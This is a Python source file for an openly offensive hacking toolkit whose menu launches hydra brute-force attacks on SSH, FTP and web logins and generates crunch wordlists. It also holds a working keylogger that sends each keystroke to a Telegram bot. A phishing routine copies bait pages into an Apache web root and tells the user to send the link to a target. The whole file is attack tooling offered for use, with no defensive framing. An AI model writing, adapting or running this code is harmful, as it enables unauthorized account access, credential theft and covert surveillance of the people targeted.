import os
import time
import sys
import colorama
import logging
import telegram
from colorama import Fore
from pynput import keyboard
from telethon import TelegramClient

# Telegram Bot API Configuration
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# Telegram Bot
bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)

# Keylogger Config
LOG_FILE = "keystrokes.log"
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Initialize colorama
colorama.init(autoreset=True)

def banner():
    """Display ASCII Art and Menu"""
    os.system("clear")
    print(Fore.RED + r"""
    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗
    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝
    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  
    ██╔═══╝ ██╔═══╝ ██║   ██║   ██║   ██╔══╝  ██╔══╝  
    ██║     ██║     ╚██████╔╝   ██║   ███████╗███████╗
    ╚═╝     ╚═╝      ╚═════╝    ╚═╝   ╚══════╝╚══════╝
    """)
    print(Fore.YELLOW + "="*50)
    print(Fore.CYAN + "[1] SSH Brute-Force Attack")
    print(Fore.CYAN + "[2] FTP Brute-Force Attack")
    print(Fore.CYAN + "[3] Web Login Brute-Force")
    print(Fore.CYAN + "[4] Generate Custom Wordlist")
    print(Fore.CYAN + "[5] Start Keylogger (Sends to Telegram)")
    print(Fore.CYAN + "[6] Setup Phishing Page")
    print(Fore.CYAN + "[7] Exit")
    print(Fore.YELLOW + "="*50)
    print(Fore.GREEN + "GitHub: https://github.com/KevinKhemra007")
    print(Fore.GREEN + "Telegram: https://t.me/hackisreal007")
    print(Fore.YELLOW + "="*50)

def ssh_brute_force(target, user, wordlist):
    """Perform SSH Brute-Force Attack"""
    print(Fore.RED + f"[⚠️] Starting SSH brute-force on {target}...")
    os.system(f"hydra -l {user} -P {wordlist} ssh://{target} -t 4")

def ftp_brute_force(target, user, wordlist):
    """Perform FTP Brute-Force Attack"""
    print(Fore.RED + f"[⚠️] Starting FTP brute-force on {target}...")
    os.system(f"hydra -l {user} -P {wordlist} ftp://{target} -t 4")

def web_brute_force(url, user, wordlist):
    """Perform Web Form Brute-Force Attack"""
    print(Fore.RED + f"[⚠️] Starting Web brute-force on {url}...")
    os.system(f"hydra -l {user} -P {wordlist} {url} http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\" -t 4")

def generate_wordlist():
    """Generate Custom Wordlist using Crunch"""
    min_length = input(Fore.YELLOW + "[🔢] Enter minimum password length: ")
    max_length = input(Fore.YELLOW + "[🔢] Enter maximum password length: ")
    charset = input(Fore.YELLOW + "[🔡] Enter character set (e.g., abc123): ")
    output_file = input(Fore.YELLOW + "[💾] Enter output filename (e.g., passwords.txt): ")
    
    print(Fore.RED + f"[⚠️] Generating wordlist...")
    os.system(f"crunch {min_length} {max_length} {charset} -o {output_file}")

def keylogger():
    """Keylogger that logs keystrokes and sends to Telegram"""
    def on_press(key):
        try:
            logging.info(str(key))
            bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"Key Pressed: {key}")
        except Exception as e:
            print(Fore.RED + f"[❌] Telegram error: {e}")

    with keyboard.Listener(on_press=on_press) as listener:
        print(Fore.GREEN + "[✅] Keylogger is running... Press Ctrl+C to stop.")
        listener.join()

def setup_phishing():
    """Setup a Phishing Page"""
    print(Fore.RED + "[⚠️] Setting up phishing page...")
    os.system("sudo service apache2 start")
    os.system("sudo cp phishing_files/* /var/www/html/")
    print(Fore.GREEN + "[✅] Phishing page is live! Send the link to the target.")

def main():
    """Main Menu"""
    while True:
        banner()
        choice = input(Fore.YELLOW + "[📌] Enter your choice: ")

        if choice == "1":
            target = input(Fore.GREEN + "[🌐] Enter SSH target IP: ")
            user = input(Fore.GREEN + "[👤] Enter SSH username: ")
            wordlist = input(Fore.GREEN + "[📄] Enter path to wordlist: ")
            ssh_brute_force(target, user, wordlist)
        elif choice == "2":
            target = input(Fore.GREEN + "[🌐] Enter FTP target IP: ")
            user = input(Fore.GREEN + "[👤] Enter FTP username: ")
            wordlist = input(Fore.GREEN + "[📄] Enter path to wordlist: ")
            ftp_brute_force(target, user, wordlist)
        elif choice == "3":
            url = input(Fore.GREEN + "[🌍] Enter target login URL: ")
            user = input(Fore.GREEN + "[👤] Enter username: ")
            wordlist = input(Fore.GREEN + "[📄] Enter path to wordlist: ")
            web_brute_force(url, user, wordlist)
        elif choice == "4":
            generate_wordlist()
        elif choice == "5":
            keylogger()
        elif choice == "6":
            setup_phishing()
        elif choice == "7":
            print(Fore.YELLOW + "[🛑] Exiting...")
            sys.exit()
        else:
            print(Fore.RED + "[❌] Invalid choice! Try again.")

if __name__ == "__main__":
    main()

